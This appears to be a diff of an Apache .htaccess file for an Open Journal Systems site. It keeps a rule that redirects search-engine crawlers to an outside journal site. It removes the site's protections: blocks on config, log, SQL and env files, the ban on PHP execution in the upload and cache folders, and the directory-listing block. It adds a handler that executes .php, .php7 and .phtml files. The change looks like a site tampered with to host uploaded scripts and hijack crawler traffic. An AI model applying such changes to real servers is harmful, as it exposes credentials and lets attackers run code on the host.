@@ -1,39 +1,9 @@
 RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
 RewriteRule ^(.*)$  https://www.pagepress.org/journals/ [R=301,L]
-<IfModule mod_rewrite.c>
-    RewriteEngine on
-
-    # 1. BLOKIR AKSES KE FILE SENSITIF
-    # ----------------------------------------------------
-    # Melindungi file .htaccess dan .htpasswd
-    <Files ~ "^.*\.([Hh][Tt][AaPp])">
-        Require all denied
-    </Files>
-    # Melindungi file konfigurasi OJS
-    <Files "config.inc.php">
-        Require all denied
-    </Files>
-    # Melindungi file log, README, dll.
-    <FilesMatch "\.(log|md|sql|ini|env)$">
-        Require all denied
-    </FilesMatch>
-
-    # 2. BLOKIR EKSEKUSI SCRIPT DI DIREKTORI TERTENTU
-    # ----------------------------------------------------
-    # Mencegah eksekusi script di cache, uploads, dll.
-    # (Ini akan diperkuat di Langkah 2)
-    RewriteRule ^cache/.*\.php$ - [F,L]
-    RewriteRule ^public/.*\.php$ - [F,L]
-    RewriteRule ^files/.*\.php$ - [F,L]
-
-    # 3. KODE FRONT CONTROLLER OJS ANDA (SUDAH BENAR)
-    # ----------------------------------------------------
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteRule ^(.*)$ index.php/$1 [QSA,L]
-
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “alt-php74” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-alt-php74 .php .php7 .phtml
 </IfModule>
-
-# Matikan daftar isi direktori
-Options -Indexes
+# php -- END cPanel-generated handler, do not edit
